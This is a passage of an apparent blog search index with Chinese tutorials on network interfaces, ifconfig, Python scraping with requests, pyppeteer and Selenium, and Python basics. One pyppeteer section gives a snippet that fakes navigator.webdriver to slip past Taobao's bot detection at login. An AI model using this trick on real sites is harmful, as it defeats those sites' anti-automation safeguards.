https://www.kancloud.cn/liupengjie/go/1010466","tags":["cobra"],"categories":["golang"]},{"title":"网络接口介绍","url":"%2Fp%2F9dad86f4.html","content":"\n### 1. 网络接口介绍\n\n##### 1.1 网络接口的命名\n\n网络接口并不存在一定的命名规范，但网络接口名字的定义一般都是要有意义的。例如：\n\n+ eth0: ethernet的简写，一般用于以太网接口。\n\n+ wifi0:wifi是无线局域网，因此wifi0一般指无线网络接口。\n\n+ ath0: Atheros的简写，一般指Atheros芯片所包含的无线网络接口。\n\n+ lo: local的简写，一般指本地环回接口。\n\n<!-- more -->\n\n##### 1.2 网络接口如何工作\n\n网络接口是用来发送和接受数据包的基本设备。\n\n系统中的所有网络接口组成一个链状结构，应用层程序使用时按名称调用。\n\n每个网络接口在linux系统中对应于一个struct net_device结构体，包含name,mac,mask,mtu…信息。\n\n每个硬件网卡(一个MAC)对应一个网络接口，其工作完全由相应的驱动程序控制。\n\n##### 1.3 虚拟网络接口\n\n虚拟网络接口的应用范围非常广泛。最着名的当属“lo”了，基本上每个linux系统都有这个接口。\n\n虚拟网络接口并不真实地从外界接收和发送数据包，而是在系统内部接收和发送数据包，因此虚拟网络接口不需要驱动程序。\n\n虚拟网络接口和真实存在的网络接口在使用上是一致的。\n\n##### 1.4 网络接口的创建\n\n硬件网卡的网络接口由驱动程序创建。而虚拟的网络接口由系统创建或通过应用层程序创建。\n\n驱动中创建网络接口的函数是：`register_netdev(struct net_device *)`或者`register_netdevice(struct net_device *)`。\n\n这两个函数的区别是：register_netdev(…)会自动生成以”eth”作为打头名称的接口，而register_netdevice(…)需要提前指定接口名称.事实上，register_netdev(…)也是通过调用register_netdevice(…)实现的。\n\n\n\n### 2. mac的网络接口\n\n- lo0 = loopback > 回环接口或者 本地主机(localhost)\n- gif0 = Software Network Interface > 通用 IP-in-IP隧道(RFC2893)\n- stf0 = 6to4 tunnel interface > 6to4连接(RFC3056)\n- en0 = Ethernet 0 > 以太网或802.11接口\n- fw0 = Firewire > IP over FireWire(IEEE-1394), macOS特有\n- en1 = Ethernet 1 > \n- vmnet8 = Virtual Interface > 虚拟网卡8\n- vmnet1 = Virtual Interface > 虚拟网卡1\n- p2p Point-to-Point 协议\n- awdl airdrop peer to peer(一种mesh network), apple airdrop设备特有\n- bridge 第2层桥接\n- vlan 虚拟局域网络\n\n在iOS设备(支持cellular)上还能看到\n\n+ pdp_ip 蜂窝数据连接\n\n那en0 en1 en2 en3 en4 怎么这么多？？？ 运行一下命令： \n\n```bash\nnetworksetup -listallhardwareports\n\nHardware Port: Wi-Fi\nDevice: en0\nEthernet Address: c4:b3:01:bd:ad:1d\n\nHardware Port: Bluetooth PAN\nDevice: en3\nEthernet Address: c4:b3:01:bd:ad:1e\n\nHardware Port: Thunderbolt 1\nDevice: en1\nEthernet Address: 4a:00:07:4d:b2:b0\n\nHardware Port: Thunderbolt 2\nDevice: en2\nEthernet Address: 4a:00:07:4d:b2:b1\n\nHardware Port: Thunderbolt Bridge\nDevice: bridge0\nEthernet Address: 4a:00:07:4d:b2:b0\n```\n\n原来是Wi-Fi，蓝牙，thunderbolt…\n\n\n\n### 3. ifconfig 命令\n\n```bash\n[root@localhost ~]# ifconfig\neth0      Link encap:Ethernet  HWaddr 00:50:56:BF:26:20  \n          inet addr:192.168.120.204  Bcast:192.168.120.255  Mask:255.255.255.0\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:8700857 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:31533 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:596390239 (568.7 MiB)  TX bytes:2886956 (2.7 MiB)\n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          UP LOOPBACK RUNNING  MTU:16436  Metric:1\n          RX packets:68 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:68 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:2856 (2.7 KiB)  TX bytes:2856 (2.7 KiB)\n```\n\n第一行：连接类型：Ethernet（以太网）HWaddr（硬件mac地址）\n\n第二行：网卡的IP地址、子网、掩码\n\n第三行：UP（代表网卡开启状态）RUNNING（代表网卡的网线被接上）MULTICAST（支持组播）MTU:1500（最大传输单元）：1500字节\n\n第四、五行：接收、发送数据包情况统计\n\n第七行：接收、发送数据字节数统计信息。\n\n\n\n其他说明:\n\n+ eth0 表示第一块网卡， 其中 HWaddr 表示网卡的物理地址，可以看到目前这个网卡的物理地址(MAC地址）是 00:50:56:BF:26:20\n\n+ inet addr 用来表示网卡的IP地址，此网卡的 IP地址是 192.168.120.204，广播地址， Bcast:192.168.120.255，掩码地址Mask:255.255.255.0 \n\n+ lo 是表示主机的回坏地址，这个一般是用来测试一个网络程序，但又不想让局域网或外网的用户能够查看，只能在此台主机上运行和查看所用的网络接口。比如把 HTTPD服务器的指定到回坏地址，在浏览器输入 127.0.0.1 就能看到你所架WEB网站了。但只是您能看得到，局域网的其它主机或用户无从知道。\n\n\n\n### 4. 参考资料\n\n+ [Linux中的lo回环接口详细介绍](https://blog.csdn.net/huguohu2006/article/details/7261106)\n\n+ [ifconfig命令](http://www.voidcn.com/article/p-ehcsampr-bmr.html)\n\n+ [ifconfig output in Mac OS X?](https://superuser.com/questions/267660/can-someone-please-explain-ifconfig-output-in-mac-os-x)\n","tags":["网络接口"],"categories":["计算机基础"]},{"title":"python爬虫利器pyppeteer的使用","url":"%2Fp%2F6b1ba1b4.html","content":"\n\n\n### 0. 前言\n\nChrome59(linux、macos)、 Chrome60(windows)之后，Chrome自带[headless(无界面)模式](https://developers.google.com/web/updates/2017/04/headless-chrome)很方便做自动化测试或者爬虫。但是如何和headless模式的Chrome交互则是一个问题。通过启动Chrome时的命令行参数仅能实现简易的启动时初始化操作。Selenium、Webdriver等是一种解决方案，但是往往依赖众多，不够扁平。\n\n\n\npuppeteer是谷歌官方出品的一个通过DevTools协议控制headless Chrome的Node库。可以通过puppeteer的提供的api直接控制Chrome模拟大部分用户操作来进行UI Test或者作为爬虫访问页面来收集数据。\n\n\n\npyperteer是puppeteer的Python实现，相比于selenium具有异步加载、速度快、具备有界面/无界面模式、伪装性更强不易被识别为机器人同时可以伪装手机平板等终端；但是也有一些缺点，如接口不易理解、语义晦涩；\n\n<!-- more -->\n\n\n\n### 1. pyppeteer使用\n\n```bash\npip3 install pyppeteer\n```\n\n\n\n\n\n##### 1.1 无头模式\n\n```python\nbrowser = await launch({'headless': False, 'args': ['--no-sandbox']})\n```\n\nheadless=True, 不弹出浏览器, 测试阶段可以设置为 False 观测\n\n##### 1.2 page方法\n\n```bash\npage.click 点击\npage.type 输入\npage.select 下拉框\n\n\npage.click('.rfm input[name=\"cookietime\"]')\n```\n\n对于 page方法内的选择元素语法请参考:  https://www.w3schools.com/cssref/css_selectors.asp\n\n\n\n### 2. pyppeteer  linux运行问题\n\n##### 2.1 centos无法运行pyppeteer\n\n```\nyum -y install libX11 libXcomposite libXcursor libXdamage libXext libXi libXtst cups-libs libXScrnSaver libXrandr alsa-lib pango atk at-spi2-atk gtk3 \n```\n\n\n\n##### 2.2 Bad NaCl helper startup ack\n\n```\nERROR:nacl_fork_delegate_linux.cc(314)] Bad NaCl helper startup ack (0 bytes)\\n\\n(chrome:24935)\n```\n\n使用无头模式\n\n\n\n##### 2.3 Navigation Timeout Exceeded: 30000 ms exceeded\n\n```\nawait page.goto(\"https://www.baidu.com\", timeout=0)\n```\n\n+ 加上timeout\n\n+ 检测封禁 ip\n\n\n\n\n\n### 3. pyppeteer 问题解决方案\n\n##### 3.1 抓取js 渲染后的数据\n\n使用 requests 是无法正常抓取到相关数据的。因为什么？因为这个页面是 JavaScript 渲染而成的，我们所看到的内容都是网页加载后又执行了 JavaScript 之后才呈现出来的，因此这些条目数据并不存在于原始 HTML 代码中，而 requests 仅仅抓取的是原始 HTML 代码。\n\n好的，所以遇到这种类型的网站我们应该怎么办呢？\n\n其实答案有很多：\n\n- 分析网页源代码数据，如果数据是隐藏在 HTML 中的其他地方，以 JavaScript 变量的形式存在，直接提取就好了。\n- 分析 Ajax，很多数据可能是经过 Ajax 请求时候获取的，所以可以分析其接口。\n- 模拟 JavaScript 渲染过程，直接抓取渲染后的结果。\n\n\n\n而 Pyppeteer 和 Selenium 就是用的第三种方法，下面我们再用 Pyppeteer 来试试，如果用 Pyppeteer 实现如上页面的抓取的话，代码就可以写为如下形式：\n\n```python\nimport asyncio\nfrom pyppeteer import launch\nfrom pyquery import PyQuery as pq\n\nasync def main():\n    browser = await launch()\n    page = await browser.newPage()\n    await page.goto('http://quotes.toscrape.com/js/')\n    doc = pq(await page.content())\n    print('Quotes:', doc('.quote').length)\n    await browser.close()\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n##### 3.2 webdriver 检测问题\n\n有些网站还是会检测到是 webdriver 吧，比如淘宝检测到是 webdriver 就会禁止登录了\n\n其实淘宝主要通过 window.navigator.webdriver 来对 webdriver 进行检测，所以我们只需要使用 JavaScript 将它设置为 false 即可，代码如下：\n\n```python\nimport asyncio\nfrom pyppeteer import launch\n\nasync def main():\n    browser = await launch(headless=False, args=['--disable-infobars'])\n    page = await browser.newPage()\n    await page.goto('https://login.taobao.com/member/login.jhtml?redirectURL=https://www.taobao.com/')\n    await page.evaluate(\n        '''() =>{ Object.defineProperties(navigator,{ webdriver:{ get: () => false } }) }''')\n    await asyncio.sleep(100)\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n##### 3.3 保持用户记录\n\n很多朋友在每次启动 Selenium 或 Pyppeteer 的时候总是是一个全新的浏览器，那就是没有设置用户目录，如果设置了它，每次打开就不再是一个全新的浏览器了，它可以恢复之前的历史记录，也可以恢复很多网站的登录信息。那么这个怎么来做呢？很简单，在启动的时候设置 userDataDir 就好了，示例如下：\n\n```python\nimport asyncio\nfrom pyppeteer import launch\n\nasync def main():\n    browser = await launch(headless=False, userDataDir='./userdata', args=['--disable-infobars'])\n    page = await browser.newPage()\n    await page.goto('https://www.taobao.com')\n    await asyncio.sleep(100)\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n### 4. 参考资料\n\n+ https://github.com/miyakogi/pyppeteer\n+ [Python爬虫入门教程 24-100 微医挂号网医生数据抓取](https://juejin.im/post/5c35944b6fb9a049de6d8dd2)\n+ [Python中与selenium齐名的pyppeteer库](https://zhuanlan.zhihu.com/p/63634783)\n+ [pyppeteer使用遇到的bug及解决方法](https://www.sanfenzui.com/pyppeteer-bug-collection.html)\n+ https://juejin.im/post/59e5a86c51882578bf185dba","tags":["爬虫"],"categories":["python"]},{"title":"python爬虫基础","url":"%2Fp%2F2412099c.html","content":"\n\n\n### 0. 前言\n\n网络爬虫（又被称为网页蜘蛛，网络机器人，在FOAF社区中间，更经常的称为网页追逐者），是一种按照一定的规则，自动的抓取万维网信息的程序或者脚本。\n\n我认为一次爬虫的过程, 就是网络请求到数据后, 处理数据, 然后发送数据的过程.\n\n<!-- more -->\n\n### 1. 网络请求(requests)\n\n python网络请求主要有 `urllib` 和 `requests`  库, 墙裂推荐`requests`\n\n```python\nimport requests\n\nurl = 'http://www.baidu.com'\nresponse = requests.get(url)\nhtml = response.text\nprint(html)\n\n\nimport requests\n\nurl = \"http://docs.python-requests.org/zh_CN/latest/_static/requests-sidebar.png\"\nresponse = requests.get(url)\nwith open('image.png','wb') as f:\n  f.write(response.content)\n```\n\n\n\n### 2. 数据提取 (pyquery)\n\n一般我们请求的数据主要分以下几类:\n\n+ html, xml\n+ json\n+ 字符串\n\n对于 html, xml 我们要使用相关的库进行处理, json直接反序列化处理, 字符串可能需要字符串匹配 和 正则表达式 处理\n\n\n\n> 对html/xml 处理的库主要有以下几种:\n\n##### 2.1 beautifulsoup\n\n```bash\npip install beautifulsoup4\n```\n\nbeautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象\n\n##### 2.2 lxml\n\nlxml 使用的是 xpath 技术\n\n```bash\npip install lxml\n```\n\n##### 2.3  lxml, beautifulSoup 对比\n\nBeautifulSoup是一个库，而XPath是一种技术，python中最常用的XPath库是lxml，因此，这里就拿lxml来和BeautifulSoup做比较吧.\n\n+ 性能 lxml >> BeautifulSoup\n\nBeautifulSoup和lxml的原理不一样，BeautifulSoup是基于DOM的，会载入整个文档，解析整个DOM树，因此时间和内存开销都会大很多。而lxml只会局部遍历，另外lxml是用c写的，而BeautifulSoup是用python写的，因此性能方面自然会差很多。\n\n+ 易用性 BeautifulSoup >> lxml\n\nBeautifulSoup用起来比较简单，API非常人性化，支持css选择器。lxml的XPath写起来麻烦，开发效率不如BeautifulSoup。\n\n```\ntitle = soup.select('.content div.title h3')\n```\n\n同样的代码用Xpath写起来会很麻烦\n\n```\ntitle = tree.xpath(\"//*[@class='content']/div[@class='content']/h3\")\n```\n\n##### 2.4. pyquery \n\npyquery 可让你用 jQuery 的语法来对 html/xml 进行操作。这和 jQuery 十分类似。这个库不是（至少还不是）一个可以和 JavaScript交互的代码库，它只是非常像 jQuery API 而已。\n\n```bash\npip install pyquery\n```\n\n我们可以看下面这个例子:\n\n```python\n    def parse_html(self,content):\n        doc = pq(content)\n        items = doc(\".dt\").items()\n        for item in items:\n            title = item.find(\"center\").text()\n            for i in item.find(\"th\").items():\n                category = i.find(\"a\").eq(0).text()\n                neirong = i.find(\"a\").eq(1).text()\n                url = i.find(\"a\").eq(1).attr('href')\n\n                one_data = {\n                    \"category\": category,\n                    \"context\": neirong,\n                    \"url\": url,\n                }\n                print(one_data)\n```\n\n\n\n### 3. 无头浏览器(pyppeteer)\n\n以前写爬虫，遇到需要登录的页面，一般都是通过chrome的检查元素，查看登录需要的参数和加密方法，如果网站的加密非常复杂，例如登录qq的，就会很蛋疼。\n\n现在有了无头浏览器，再也不需要考虑登录的参数和加密了，用无头浏览器打开页面，通过JS或JQuery语句，填入账号和密码，然后点击登陆，然后把Cookies保存下来，就可以模拟登陆了。\n\n\n\n##### 3.1 PhantomJS(暂停开发)\n\n```\nserWarning: Selenium support for PhantomJS has been deprecated, please use headless versions of Chrome or Firefox instead\n\n新版本的Selenium不再支持PhantomJS了，请使用Chrome或Firefox的无头版本来替代。\n```\n\n\n\nPhantomJS是一个无界面的,可脚本编程的WebKit浏览器引擎。它原生支持多种web 标准：DOM 操作，CSS选择器，JSON，Canvas 以及SVG。因此可以比浏览器更加快速的解析处理js加载。\n\n\n\n有时，我们需要浏览器处理网页，但并不需要浏览，比如生成网页的截图、抓取网页数据等操作。[PhantomJS](http://phantomjs.org/)的功能，就是提供一个浏览器环境的命令行接口，你可以把它看作一个“虚拟浏览器”，除了不能浏览，其他与正常浏览器一样。它的内核是WebKit引擎，不提供图形界面，只能在命令行下使用，我们可以用它完成一些特殊的用途。\n\n\n\n下载: https://phantomjs.org/download.html , 然后把二进制放到一个目录下, 增加个$PATH 指定即可\n\n```\nphantomjs -v\n```\n\n\n\n##### 3.2. selenium\n\nselenium 是什么？一句话，自动化测试工具。它支持各种浏览器，包括 Chrome，Safari，Firefox 等主流界面式浏览器。换句话说叫 Selenium 支持这些浏览器驱动。话说回来，PhantomJS不也是一个浏览器吗，那么 Selenium 支持不？答案是肯定的，这样二者便可以实现无缝对接了。有人问，为什么不直接用浏览器而用一个没界面的 PhantomJS 呢？答案是：效率高！\n\n\n\n嗯，所以呢？安装一下 Python 的 Selenium 库，再安装好 PhantomJS，不就可以实现 Python＋Selenium＋PhantomJS 的无缝对接了嘛！Selenium 用来驱动浏览器, PhantomJS 用来渲染解析界面, Python 进行后期的处理，完美的三剑客！\n\n\n\n```\npip install selenium\n```\n\n\n\n然后我们看一个例子, 通过 selenium 驱动 [chrome driver](https://sites.google.com/a/chromium.org/chromedriver/downloads)打开百度搜索关键词\n\n```python\nfrom selenium import webdriver\nfrom selenium.webdriver.common.keys import Keys\n\nbrowser = webdriver.Chrome(executable_path=\"./drivers/chromedriver\")\nbrowser.get('http://www.baidu.com/')\n\nkw = browser.find_element_by_id(\"kw\")\nkw.send_keys(\"Selenium\", Keys.RETURN)\n```\n\n\n\n##### 3.3. pyppeteer \n\npyppeteer 是依赖于 chromium 这个浏览器来运行的,  并且是基于 python 的新特性 async 实现的，所以它的一些执行也支持异步操作，效率相对于 selenium 来说也提高了。\n\n```bash\npip3 install pyppeteer\n```\n\n我们可以来看下面这个例子, 是打开baidu 后截图\n\n```python\nimport asyncio\nfrom pyppeteer import launch\n\nasync def main():\n    browser = await launch()\n    page = await browser.newPage()\n    await page.goto('http://www.baidu.com')\n    await page.screenshot({'path': 'example.png'})\n    await browser.close()\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n### 4. 爬虫框架\n\n\n\n##### 4.1 pyspider\n\npyspider上手更简单，操作更加简便，因为它增加了 WEB 界面，写爬虫迅速，集成了phantomjs，可以用来抓取js渲染的页面。\n\n```bash\npip install pyspider\n```\n\n安装成功后在 [python 3.7 下运行就报错](https://github.com/binux/pyspider/issues/817), 看来作者很久没维护了\n\n\n\n\n##### 4.2 scrapy\n\n```bash\npip install Scrapy\n```\n\nscrapy自定义程度高，比 PySpider更底层一些，适合学习研究，需要学习的相关知识多，不过自己拿来研究分布式和多线程等等是非常合适的。\n\n\n\n### 5. 爬虫其他(TODO)\n\n##### 5.1 多线程\n\n thread 库\n\n##### 5.2 多进程\n\nmultiprocessing 库\n\n\n\n### 6. 参考资料\n\n+ https://cuiqingcai.com/1052.html\n+ https://cuiqingcai.com/6942.html\n+ https://github.com/Kr1s77/Python-crawler-tutorial-starts-from-zero","tags":["爬虫"],"categories":["爬虫"]},{"title":"python_requests的使用","url":"%2Fp%2F4a761254.html","content":"\n\n\nrequest是一个简答优雅的python HTTP库，相较于python标准库中的urllib和urllib2的库，requests更加的便于理解和使用.\n\n\n\n### 1. 安装 requests\n\n```bash\npip install requests\n```\n\n<!-- more -->\n\n### 2. requests包的使用\n\n##### get\n\n```\n>>> payload = {'key1': 'value1', 'key2': 'value2'}\n>>> r = requests.get('https://httpbin.org/get', params=payload)\n\n>>> print(r.url)\nhttps://httpbin.org/get?key2=value2&key1=value1\n```\n\n\n\n##### post\n\n```python\nimport requests\nimport json\n\nheaders = {'content-type': 'application/json'}\nurl = 'http://192.168.3.45:8080/api/v2/event/log'\n\ndata = {\"eventType\": \"AAS_PORTAL_START\", \"data\": {\"uid\": \"hfe3hf45huf33545\", \"aid\": \"1\", \"vid\": \"1\"}}\nparams = {'sessionKey': '9ebbd0b25760557393a43064a92bae539d962103', 'format': 'xml', 'platformId': 1}\n\nrequests.post(url, params=params, data=json.dumps(data), headers=headers, timeout=2)\n```\n\n\n\n##### parse \n\n```python\nimport requests\nrequests.get(url).json()\n```\n\n\n\n\n\n### 3. 参考资料:\n\n+ https://2.python-requests.org//zh_CN/latest/user/quickstart.html","tags":["requests"],"categories":["python"]},{"title":"python基础实践","url":"%2Fp%2Fd319c20d.html","content":"\n### 1. 模块\n\nPython 模块(Module)，是一个 Python 文件，以 .py 结尾，包含了 Python 对象定义和Python语句。\n\n```python\nfrom pkg.func import hello\n# pkg 是模块名字,就是目录名字\n# pkg.func 是 pkg 目录下的 func 文件\n# hello 是 func 文件的 hello函数\n\n\nfrom pkg.topic import Topic\n# Topic 是 topic 文件的 类\n```\n\n\n\n+ `__init__.py` ,如果目录中存在该文件，该目录就会被识别为 module package 。\n+ `__init__.py` 在包被导入时会被执行。该文件就是一个正常的python代码文件，因此可以将初始化代码放入该文件中。\n\n<!-- more -->\n\n### 2. python命名规范\n\n##### 2.1 模块\n\n- 模块尽量使用小写命名，首字母保持小写，尽量不要用下划线(除非多个单词，且数量不多的情况)\n\n```python\n# 正确的模块名\nimport decoder\nimport html_parser\n\n# 不推荐的模块名\nimport Decoder\n```\n\n##### 2.2 类名\n\n- 类名使用驼峰(CamelCase)命名风格，首字母大写，私有类可用一个下划线开头\n\n```Python\nclass Farm():\n    pass\n\nclass AnimalFarm(Farm):\n    pass\n\nclass _PrivateFarm(Farm):\n    pass\n```\n\n- 将相关的类和顶级函数放在同一个模块里. 不像Java, 没必要限制一个类一个模块.\n\n##### 2.3 函数\n\n- 函数名一律小写，如有多个单词，用下划线隔开\n\n```python\ndef run():\n    pass\n\ndef run_with_env():\n    pass\n```\n\n- 私有函数在函数前加一个下划线_\n\n```python\nclass Person():\n    def _private_func():\n        pass\n```\n\n##### 2.4 变量名\n\n- 变量名尽量小写, 如有多个单词，用下划线隔开\n\n```python\nif __name__ == '__main__':\n    count = 0\n    school_name = ''\n```\n\n##### 2.5 常量\n\n- 常量使用以下划线分隔的大写命名\n\n```python\nMAX_CLIENT = 100\nMAX_CONNECTION = 1000\nCONNECTION_TIMEOUT = 600\n```\n\n\n\n### 3. python 方法返回多个值\n\n```python\ndef f():\n    return True, False\n  \n  \nx, y = f()\nprint(x)\nprint(y)\n\ngives:\nTrue\nFalse\n```\n\n\n\n### 4. sprintf()格式化输出\n\n```python\n# 字符串\n'%s %s' % ('one', 'two')\n'{} {}'.format('one', 'two')\none two\n\n\n# int\n'%d %d' % (1, 2)\n'{} {}'.format(1, 2)\n1 2\n\n\n# float\n'%f' % (3.141592653589793,)\n'{:f}'.format(3.141592653589793)\n3.141593\n\n\n# 顺序\n'{1} {0}'.format('one', 'two')\ntwo one\n```\n\n\n\n### 5.  for循环\n\n```python\n# for in 循环\nfruits = [\"apple\", \"banana\", \"cherry\"]\nfor x in fruits:\n  print(x)\n  \n  \n# range循环\nfor x in range(2, 6):\n  print(x)#2 3 4 5\nfor x in range(2, 10, 3):\n  print(x)# 2 5 8\n  \n  \n\n# 循环带 k, v\npresidents = [\"Washington\", \"Adams\", \"Jefferson\", \"Madison\", \"Monroe\", \"Adams\", \"Jackson\"]\nfor num, name in enumerate(presidents, start=1):\n    print(\"President {}: {}\".format(num, name))\n    \n  \n# 循环多个\ncolors = [\"red\", \"green\", \"blue\", \"purple\"]\nratios = [0.2, 0.3, 0.1, 0.4]\nfor color, ratio in zip(colors, ratios):\n    print(\"{}% {}\".format(ratio * 100, color))\n    \n    \n# 死循环\nwhile True:\n  pass\n```\n\n\n\n### 6. `if __name__ == 'main'`\n\n一个python的文件有两种使用的方法，第一是直接作为脚本执行，第二是import到其他的python脚本中被调用（模块重用）执行。\n\n\n\n`if __name__ == 'main'`: 的作用就是控制这两种情况执行代码的过程，在`if __name__ == 'main'`: 下的代码只有在第一种情况下（即文件作为脚本直接执行）才会被执行，而import到其他脚本中是不会被执行的。\n\n\n\n\n\n### 7. `__pycache__`\n\n在python中运行程序时，解释器首先将其编译为字节码，并将其存储在`__pycache__`文件夹。如果您在那里查找，您将发现一堆文件共享的名称。在项目文件夹中的Py文件，只有它们的扩展名才是其中之一.PYC或.pyo.。这些分别是字节码编译和优化字节码编译版本的程序的文件。\n\n\n下次再执行工程时，若解释器发现这个 *.py 脚本没有修改过，就会跳过编译这一步，直接运行以前生成的保存在 __pycache__文件夹里的 *.pyc 文件。\n\n这样工程较大时就可以大大缩短项目运行前的准备时间；如果你只需执行一个小工程，没关系 忽略这个文件夹就行。\n\n\n\n### 8. 打开文件设置编码读取\n\n```python\nwith open(\"1.html\", \"r\", encoding='gbk') as f:\n  contents = f.read()\n  parse_html(contents)\n```\n\n\n\n### 9. 读写 json 文件\n\n```python\nclass File(object):\n    def __init__(self):\n        self.name = \"zk8.json\"\n        if not os.path.exists(self.name): # 没有就写一下\n            with open(self.name, 'w'): pass\n\n\n    def save(self, data):\n        with open(self.name, 'w', encoding='utf-8') as f:\n            json.dump(data, f, ensure_ascii=False, indent=4)\n\n\n    def load(self):\n        with open(self.name, 'r', encoding='utf-8') as f:\n            data = json.load(f)\n            return data\n\n```\n\n\n\n### 10. 数据结构 操作\n\n```python\n############ list ############\n>>> fruits = ['orange', 'apple', 'pear', 'banana', 'kiwi', 'apple', 'banana']\n>>> fruits.count('apple')\n2\n>>> fruits.count('tangerine')\n0\n>>> fruits.index('banana')\n3\n>>> fruits.index('banana', 4)  # Find next banana starting a position 4\n6\n>>> fruits.reverse()\n>>> fruits\n['banana', 'apple', 'kiwi', 'banana', 'pear', 'apple', 'orange']\n>>> fruits.append('grape')\n>>> fruits\n['banana', 'apple', 'kiwi', 'banana', 'pear', 'apple', 'orange', 'grape']\n>>> fruits.sort()\n>>> fruits\n['apple', 'apple', 'banana', 'banana', 'grape', 'kiwi', 'orange', 'pear']\n>>> fruits.pop()\n'pear'\n\n\n############ tuple ############\n\n>>> t = 12345, 54321, 'hello!'\n>>> t[0]\n12345\n>>> t\n(12345, 54321, 'hello!')\n>>> # Tuples may be nested:\n... u = t, (1, 2, 3, 4, 5)\n>>> u\n((12345, 54321, 'hello!'), (1, 2, 3, 4, 5))\n>>> # Tuples are immutable:\n... t[0] = 88888\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nTypeError: 'tuple' object does not support item assignment\n>>> # but they can contain mutable objects:\n... v = ([1, 2, 3], [3, 2, 1])\n>>> v\n([1, 2, 3], [3, 2, 1])\n\n############ set ############\n\n>>> basket = {'apple', 'orange', 'apple', 'pear', 'orange', 'banana'}\n>>> print(basket)                      # show that duplicates have been removed\n{'orange', 'banana', 'pear', 'apple'}\n>>> 'orange' in basket                 # fast membership testing\nTrue\n>>> 'crabgrass' in basket\nFalse\n\n>>> # Demonstrate set operations on unique letters from two words\n...\n>>> a = set('abracadabra')\n>>> b = set('alacazam')\n>>> a                                  # unique letters in a\n{'a', 'r', 'b', 'c', 'd'}\n>>> a - b                              # letters in a but not in b\n{'r', 'd', 'b'}\n>>> a | b                              # letters in a or b or both\n{'a', 'c', 'r', 'd', 'b', 'm', 'z', 'l'}\n>>> a & b                              # letters in both a and b\n{'a', 'c'}\n>>> a ^ b                              # letters in a or b but not both\n{'r', 'd', 'b', 'm', 'z', 'l'}\n\n\n\n\n############ dict ############\n>>> tel = {'jack': 4098, 'sape': 4139}\n>>> tel['guido'] = 4127\n>>> tel\n{'jack': 4098, 'sape': 4139, 'guido': 4127}\n>>> tel['jack']\n4098\n>>> del tel['sape']\n>>> tel['irv'] = 4127\n>>> tel\n{'jack': 4098, 'guido': 4127, 'irv': 4127}\n>>> list(tel)\n['jack', 'guido', 'irv']\n>>> sorted(tel)\n['guido', 'irv', 'jack']\n>>> 'guido' in tel\nTrue\n>>> 'jack' not in tel\nFalse\n\n# 避免 循环中删除 key 报错\nfor i in list(d):\n  del d[i]\n```\n\n\n\n\n\n### 11. 类的特殊函数\n\n```python\n# __init__ 构造\nclass Foo:\n    def __init__(self, a, b, c):\nx = Foo(1, 2, 3) \n\n## __del__ 析构\nclass FileObject:\n    def __del__(self):\n        self.file.close()\n        del self.file\n\n\n# __call__ 类变成可调用\nclass Foo:\n    def __call__(self, a, b, c):\nx = Foo()\nx(1, 2, 3) \n\n\n#__getattr__ 不存在的属性\nclass Dummy(object):\n    def __getattr__(self, attr):\n        return attr.upper()\nd = Dummy()\nd.does_not_exist # 'DOES_NOT_EXIST'\n```\n\n\n\n### 12. 枚举\n\n```python\nfrom enum import Enum \nclass Animal(Enum):\n    ant = 1\n    bee = 2\n    cat = 3\n    dog = 4\n```\n\n\n\n### 13. 新的线程定时执行函数\n\n```python\ntimer = threading.Timer(10, func)\ntimer.start()\n```\n\n\n\n### 14. PYTHONPATH \n\n主要解决 ModuleNotFoundError: No module named 'pkg'\n\n```bash\necho $PYTHONPATH\nexport PYTHONPATH=\"/Users/liuwei/workspace/python/zk8\"\n```\n\n\n\n### 15. time\n\n```python\n# time format\nfrom datetime import datetime\ndatetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n\n# time diff\ndef get_time_diff(date):\n    FMT = '%Y-%m-%d %H:%M'\n    now = datetime.datetime.strptime(time.strftime(FMT), FMT)\n    start = datetime.datetime.strptime(date, FMT)\n    return (now - start).seconds\n  \n  \n# seconds to human  \nstr(datetime.timedelta(seconds=get_time_diff(10000)))\n```\n\n\n\n### 16. try catch\n\n```python\n# except and raise\ntry:\n    f = open('myfile.txt')\n    s = f.readline()\n    i = int(s.strip())\nexcept OSError as err:\n    print(\"OS error: {0}\".format(err))\nexcept ValueError:\n    print(\"Could not convert data to an integer.\")\nexcept:\n    print(\"Unexpected error:\", sys.exc_info()[0])\n    raise\n    \n\n # 拿到 error 信息\ntry:\n  except Exception as e:\n  else:\n    \n try:\n  except Exception as e:\n  finally:\n```\n\n\n\n### 17. string\n\n```python\nstring = 'GeeksforGeeks'\nprint(string.lower()) \nprint(string.upper()) \n\n\n# contain\n>>> str = \"Messi is the best soccer player\"\n>>> \"soccer\" in str\nTrue\n```\n\n\n\n\n\n### 18. 类\n\n```python\n\"\"\"\n（1）_xxx      \"单下划线 \" 开始的成员变量叫做保护变量，意思是只有类实例和子类实例能访问到这些变量，\n需通过类提供的接口进行访问；不能用'from module import *'导入\n（2）__xxx    类中的私有变量/方法名 （Python的函数也是对象，所以成员方法称为成员变量也行得通。）,\n\" 双下划线 \" 开始的是私有成员，意思是只有类对象自己能访问，连子类对象也不能访问到这个数据。\n（3）__xxx__ 系统定义名字，前后均有一个“双下划线” 代表python里特殊方法专用的标识，如 __init__（）代表类的构造函数。\n\"\"\"\n```\n\n\n\n\n\n### 19. 打乱list\n\n```\ncats = list(range(10, 17))\nrandom.shuffle(cats)\n```\n\n\n\n### *arg 和**args\n\nhttp://www.wklken.me/posts/2013/12/21/how-to-use-args-and-kwargs-in-python.html","tags":["python"],"categories":["python"]},{"title":"记录一次docker镜像的构建过程","url":"%2Fp%2F2450240c.html","content":"\n在制作 Docker Images 之前, 我们先看一下Docker 官方提供了一些建议和准则，在大多数情况下建议遵守。\n\n+ 